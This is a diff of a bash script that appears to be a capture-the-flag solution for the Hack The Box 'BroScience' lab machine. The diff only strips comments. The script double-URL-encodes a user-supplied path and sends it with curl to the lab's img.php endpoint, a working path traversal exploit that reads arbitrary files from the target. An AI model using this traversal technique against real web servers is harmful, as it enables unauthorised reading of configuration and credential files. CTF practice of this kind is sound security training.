@@ -1,6 +1,5 @@
 #!/bin/bash
-
-# Define colors
+#Colors
 BLACK='\033[0;30m'
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -22,20 +21,13 @@ echo  -e " ${GREEN} |  _ <| '__/ _ \\___ \ / __| |/ _ \ '_ \ / __/ _ \ "
 echo  -e " ${GREEN} | |_) | | | (_) |___) | (__| |  __/ | | | (_|  __/ "
 echo  -e " ${GREEN} |____/|_|  \___/_____/ \___|_|\___|_| |_|\___\___| ${NC}"
                      
-# Print banner
 echo -e "${YELLOW}By: César Arias (SxZkD)${NC}"
 
-# Prompt for path input
 read -p "Enter the path: " path
 
-# Construct URL with path input
 url="https://broscience.htb/includes/img.php?path=${path//\//%252f}"
 
-
-
-# Send request to URL and store response in variable
 ans=$(curl -sk "$url")
 
 echo -e "${RED}$ans${NC}"
-
 
